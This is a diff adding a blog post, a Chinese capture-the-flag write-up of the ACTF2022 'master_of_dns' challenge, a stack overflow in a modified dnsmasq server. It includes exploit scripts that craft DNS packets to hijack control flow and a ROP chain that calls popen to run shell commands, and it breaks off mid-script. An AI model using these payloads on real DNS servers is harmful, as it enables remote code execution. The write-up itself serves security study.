@@ -1,0 +1,562 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="练习题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF2022 pwn master_of_dns">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/index.html">
+<meta property="og:site_name" content="blingbling&#39;s blog">
+<meta property="og:description" content="练习题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220701152020637.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220701154221873.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220628002022674.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220628002142647.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220628002718182.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220630175529627.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220628174139141.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220628174655395.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220628174745837.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220628175000577.png">
+<meta property="article:published_time" content="2022-07-01T08:17:26.000Z">
+<meta property="article:modified_time" content="2022-07-01T08:22:01.858Z">
+<meta property="article:author" content="blingbling">
+<meta property="article:tag" content="dns">
+<meta property="article:tag" content="wireshark">
+<meta property="article:tag" content="scapy">
+<meta property="article:tag" content="bindiff">
+<meta property="article:tag" content="gdb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/image-20220701152020637.png"><title>ACTF2022 pwn master_of_dns | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-master-of-dns/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"ocean","wordWrap":false},
+  reward: false,
+  fancybox: true,
+  zoomImage: undefined,
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">blingbling's blog</div><div class="header-banner-info__subtitle">Clang鱼塘</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">ACTF2022 pwn master_of_dns</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-07-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-07-01</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><ul>
+<li><p>题目描述：I heard that you are proficient in the DNS protocol, there is just a chance to verify your ability, come and join to solve it.</p>
+</li>
+<li><p>题目附件：<a href="Maser_of_DNS.zip">Maser_of_DNS.zip</a></p>
+</li>
+<li><p>提示：题目参考代码: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://thekelleys.org.uk/dnsmasq/doc.html" >https://thekelleys.org.uk/dnsmasq/doc.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+</ul>
+<p>这个题涉及的知识点较多（对我来说），有没见过的利用方法/思路，有见过但还不够熟悉的点。所以还花了蛮多时间慢慢调试的。</p>
+
+        <h1 id="总结"   >
+          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h1>
+      <ul>
+<li>一个dns服务器，通过dig发送一条dns请求报文进行通信</li>
+<li>分析dns，根据提示，是dnsmasq。下载对应版本源码，并修改编译选项，编译后使用bindif进行比较</li>
+<li>比较找到可疑漏洞点memcpy</li>
+<li>使用gdb下断点调试memcpy处</li>
+<li>使用wireshark抓dig与dns的通信报文，并用scapy重放</li>
+<li>找到关键字段，更改后给dns发送恶意报文</li>
+<li>超长报文覆盖返回地址，dns程序崩溃。于是得到了任意代码执行权限</li>
+<li>无法泄露信息，考虑ROP利用</li>
+</ul>
+
+        <h1 id="分析"   >
+          <a href="#分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析" class="headerlink" title="分析"></a>分析</h1>
+      
+        <h2 id="运行"   >
+          <a href="#运行" class="heading-link"><i class="fas fa-link"></i></a><a href="#运行" class="headerlink" title="运行"></a>运行</h2>
+      <p>题目附件运行情况如下，dns是一个dns解析器，我们可以控制发送给它的请求报文内容。</p>
+<p><img src="image-20220701152020637.png" alt="image-20220701152020637"></p>
+
+        <h2 id="控制输入"   >
+          <a href="#控制输入" class="heading-link"><i class="fas fa-link"></i></a><a href="#控制输入" class="headerlink" title="控制输入"></a>控制输入</h2>
+      <p>dig程序将报文发送的细节给封装了起来，而我们需要控制发送报文的每一个字节。</p>
+<p>因此，使用wireshark抓包。然后，更改报文内容，重新发送。</p>
+<p>详情见【wireshark+scapy处理网络数据包】章节。</p>
+
+        <h2 id="寻找漏洞"   >
+          <a href="#寻找漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2>
+      <p>找漏洞有两种方法：</p>
+<ol>
+<li>类fuzz法：随机改变发送报文的内容，测试能否让dns服务崩溃（看运气）</li>
+<li>代码检视：一点点逆向它的逻辑速度太慢，确认它是dnsmasq 2.86后，可以使用bindiff比对</li>
+</ol>
+<p>这里我们使用第二种方法。</p>
+<p>下载dnsmasq 2.86软件包并编译：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz</span><br><span class="line">tar -zxvf dnsmasq-2.86.tar.gz</span><br><span class="line"><span class="built_in">cd</span> dnsmasq-2.86</span><br><span class="line"><span class="comment"># 更改Makefile</span></span><br><span class="line"><span class="comment"># CFLAGS        = -m32 -fno-stack-protector</span></span><br><span class="line"><span class="comment"># LDFLAGS       = -m32 -no-pie</span></span><br><span class="line">make</span><br><span class="line"><span class="comment"># 在./src/目录下获得dnsmasq</span></span><br></pre></td></tr></table></div></figure>
+<p>编译完成后，使用<strong>函数级diff工具</strong> <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.zynamics.com/software.html" >bindiff</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 对比查看二进制的差异点。</p>
+<p><img src="image-20220701154221873.png" alt="image-20220701154221873"></p>
+<p>发现一个大大的memcpy，于是通过 <code>gdb -p &lt;dns-pid&gt;</code> attach到dns进程，在 <code>b *0804F444</code> 处下断点，观察发送的数据中哪个部分会送到这块进行处理。</p>
+
+        <h2 id="初步调试"   >
+          <a href="#初步调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#初步调试" class="headerlink" title="初步调试"></a>初步调试</h2>
+      <p>将断点打在memcpy处进行调试</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一个窗口</span></span><br><span class="line">./dns -C ./dns.conf</span><br><span class="line">ps -ef | grep dns</span><br><span class="line">sudo gdb -p &lt;dns pid&gt;</span><br><span class="line">&gt; b *0x0804F444</span><br><span class="line">&gt; c</span><br><span class="line"><span class="comment"># 第二个窗口</span></span><br><span class="line">dig @127.0.0.1 -p 9999 baidu.com</span><br></pre></td></tr></table></div></figure>
+<p>断点情况如下</p>
+<p><img src="image-20220628002022674.png" alt="image-20220628002022674"></p>
+<p>拷贝完成后的栈空间：</p>
+<p><img src="image-20220628002142647.png" alt="image-20220628002142647"></p>
+<p>根据该漏洞函数中dest的位置，定位ebp和返回地址的内存位置</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804F345</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">void</span> *src, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">848</span>]; <span class="comment">// [esp+7h] [ebp-381h] BYREF</span></span><br></pre></td></tr></table></div></figure>
+<p>计算得到ebp存放地址：<code>0xffa650b7 + 0x381 = 0xffa65438</code></p>
+<p>查看该栈地址附近内存情况，找到返回地址存放在<code>0xffa6543c</code>处，计算偏移：<code>0xffa6543c - 0xffa650b7 = 0x385  </code></p>
+<p><img src="image-20220628002718182.png" alt="image-20220628002718182"></p>
+
+        <h2 id="撰写脚本"   >
+          <a href="#撰写脚本" class="heading-link"><i class="fas fa-link"></i></a><a href="#撰写脚本" class="headerlink" title="撰写脚本"></a>撰写脚本</h2>
+      <p>通过python脚本发送恶意构造的报文，使输入数据覆盖 <code>sub_804F345</code> 的返回地址。（本题没开canary）</p>
+<p>需要注意几点：</p>
+<ol>
+<li>域名中一定包含”.”，点和点之间最多存放0x3f字节的数据</li>
+<li>“.”在传输过程中，被替换成了后一串字符的实际长度（wireshark抓包发现）</li>
+<li>dns报文中Raw数据的总长度，不能超过0x400（<code>sub_804F345</code>函数中有检查）</li>
+</ol>
+
+        <h4 id="使用scapy发送"   >
+          <a href="#使用scapy发送" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用scapy发送" class="headerlink" title="使用scapy发送"></a>使用scapy发送</h4>
+      <p>这个脚本可以将返回地址覆盖成g.ab</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&quot;udp&quot;</span>)</span><br><span class="line"></span><br><span class="line">packet = rdpcap(<span class="string">&quot;./dns_catch.pcapng&quot;</span>)</span><br><span class="line">byte_data = packet[<span class="number">2</span>][Raw].load</span><br><span class="line">dns_data = DNS(byte_data)</span><br><span class="line"></span><br><span class="line">patch = <span class="string">b&quot;ls &gt; /tmp/x #&quot;</span>.ljust(<span class="number">0x3f</span>,<span class="string">b&quot;;&quot;</span>)+<span class="string">b&quot;.&quot;</span></span><br><span class="line">shellcode1 = patch*<span class="number">13</span>+<span class="string">b&#x27;ls &gt; /tmp/x #iiiiiiiiiiiiiiii&#x27;</span>+<span class="string">&#x27;erty&#x27;</span>+<span class="string">b&#x27;ooooooooooooooooooooooo.bnmk&#x27;</span>+<span class="string">&#x27;;;.b&#x27;</span>+<span class="string">b&quot;cde.&quot;</span></span><br><span class="line"><span class="comment"># erty -&gt; eax</span></span><br><span class="line"><span class="comment"># ;;.b -&gt; ebx</span></span><br><span class="line"><span class="comment"># cde. -&gt; ebp</span></span><br><span class="line"></span><br><span class="line">shellcode2 = p32(<span class="number">0x11111111</span>)</span><br><span class="line"><span class="comment"># 劫持eip为0x11111111</span></span><br><span class="line">name_seg = shellcode1 + shellcode2</span><br><span class="line">dns_data.qd = DNSQR(qname=name_seg,qtype=<span class="number">1</span>,qclass=<span class="number">1</span>)</span><br><span class="line">byte_send = raw(dns_data)</span><br><span class="line">io.sendline(byte_send)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h4 id="使用pwntools构造裸包"   >
+          <a href="#使用pwntools构造裸包" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用pwntools构造裸包" class="headerlink" title="使用pwntools构造裸包"></a>使用pwntools构造裸包</h4>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/zhangmingcai/article/details/116719599" >DNS域名长度限制说明以及实验室实战</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://support.umbrella.com/hc/en-us/articles/232254248-Common-DNS-return-codes-for-any-DNS-service-and-Umbrella-" >Common DNS return codes for any DNS service</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/buside/article/details/97139367" >Wireshark分析DNS协议</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.firewall.cx/networking-topics/protocols/domain-name-system-dns/160-protocols-dns-query.html" >DNS QUERY MESSAGE FORMAT</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.zhihu.com/question/23042131" >DNS原理及其解析过程</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>经过测试，dns请求报文中，域名字段，通过<code>&quot;.&quot;</code>分隔开，点与点之间的字符个数必须<code>&lt;=0x3f</code></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&quot;udp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = b&quot;\x24\xb4\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01\x05\x62\x61\x69\x64\x75\x03\x63\x6f\x6d\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x0c\x00\x0a\x00\x08\xbe\x1c\x51\x4d\x75\xab\x0c\x7f&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># patch = b&quot;\x3f&quot;+b&quot;ls &gt; /tmp/x#&quot;.ljust(0x3f,b&quot;;&quot;)</span></span><br><span class="line">patch = <span class="string">b&quot;\x3f&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">0x3f</span></span><br><span class="line"></span><br><span class="line">a_1 = <span class="string">b&quot;\x24\xb4\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01&quot;</span></span><br><span class="line">a_2 = patch*<span class="number">14</span>+<span class="string">b&quot;\x04&quot;</span>+<span class="string">b&quot;bcde&quot;</span></span><br><span class="line">a_3 = <span class="string">b&quot;\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x0c\x00\x0a\x00\x08\xbe\x1c\x51\x4d\x75\xab\x0c\x7f&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x04&quot;</span>+<span class="string">b&quot;ghij&quot;</span></span><br><span class="line"><span class="comment"># 劫持eip为&quot;ghij&quot;</span></span><br><span class="line">a = a_1 + a_2 + shellcode + a_3</span><br><span class="line">io.sendline(a)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="控制流劫持后的利用"   >
+          <a href="#控制流劫持后的利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#控制流劫持后的利用" class="headerlink" title="控制流劫持后的利用"></a>控制流劫持后的利用</h1>
+      
+        <h2 id="方法1：往-tmp目录注入脚本"   >
+          <a href="#方法1：往-tmp目录注入脚本" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法1：往-tmp目录注入脚本" class="headerlink" title="方法1：往/tmp目录注入脚本"></a>方法1：往/tmp目录注入脚本</h2>
+      <blockquote>
+<p>不直接将wget字符串写在bss段给popen调用的原因：利用<code>0x0804b2bb</code>这条gadget写入时，一次攻击最多只能写20字节，无法写完wget请求的完整字符串。</p>
+</blockquote>
+<p>有用gadget，可以往任意地址写值：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0804b2bb : mov dword ptr [eax], edx ; ret</span><br></pre></td></tr></table></div></figure>
+<p>往bss段写入内容：</p>
+<ol>
+<li>将bss段地址pop给eax</li>
+<li>将待写入内容（4bytes）pop给edx</li>
+</ol>
+<p>最后调popen执行写入的内容：</p>
+<ol>
+<li><p>方法1，将参数写死在栈上（bss段地址和字符串”r”的地址已知）</p>
+</li>
+<li><p>方法2，将参数分别pop给eax和edx，然后跳转到如下gadget</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x08071802 : push    edx             ; modes</span><br><span class="line">0x08071803 : push    eax             ; command</span><br><span class="line">0x08071804 : call    _popen</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+</li>
+</ol>
+<p>完整EXP如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">packet = rdpcap(<span class="string">&quot;./dns_catch.pcapng&quot;</span>)</span><br><span class="line">byte_data = packet[<span class="number">2</span>][Raw].load</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x08059d44</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0807ec72</span></span><br><span class="line">mov_eax_edx_ret = <span class="number">0x0804b2bb</span></span><br><span class="line">bss_data_addr = <span class="number">0x80a72d0</span> <span class="comment"># 0x80a7160</span></span><br><span class="line">nop_2e_ret = <span class="number">0x0804a92e</span></span><br><span class="line">str_r_addr = <span class="number">0x809c7b2</span></span><br><span class="line">popen_plt_addr = <span class="number">0x0804AB40</span></span><br><span class="line">exit_addr = <span class="number">0x0804AD30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回shellcode：往任意一个地址写20个字节的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arw4</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">	shellcode = p32(pop_eax_ret) + p32(addr) + p32(pop_edx_ret) + value + p32(mov_eax_edx_ret)</span><br><span class="line">	<span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回shellcode：调用popen函数，需指定两个参数地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_popen</span>(<span class="params">commands,modes</span>):</span></span><br><span class="line">	shellcode = p32(popen_plt_addr) + p32(exit_addr) + p32(commands) + p32(modes)</span><br><span class="line">	<span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打包shellcode：发送20字节（5*4byte）的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_payload5</span>(<span class="params">mycmd</span>):</span></span><br><span class="line">    payload = arw4(bss_data_addr,mycmd[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    payload += arw4(bss_data_addr+<span class="number">4</span>,mycmd[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    payload += arw4(bss_data_addr+<span class="number">8</span>,mycmd[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">    payload += p32(nop_2e_ret)</span><br><span class="line">    payload += arw4(bss_data_addr+<span class="number">12</span>,mycmd[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">    payload += arw4(bss_data_addr+<span class="number">16</span>,mycmd[<span class="number">16</span>:<span class="number">20</span>])</span><br><span class="line">    payload += call_popen(bss_data_addr,str_r_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="comment"># 打包shellcode：发送16字节（4*4byte）的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_payload4</span>(<span class="params">mycmd</span>):</span></span><br><span class="line">    payload = arw4(bss_data_addr,mycmd[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    payload += arw4(bss_data_addr+<span class="number">4</span>,mycmd[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    payload += arw4(bss_data_addr+<span class="number">8</span>,mycmd[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">    payload += p32(nop_2e_ret)</span><br><span class="line">    payload += 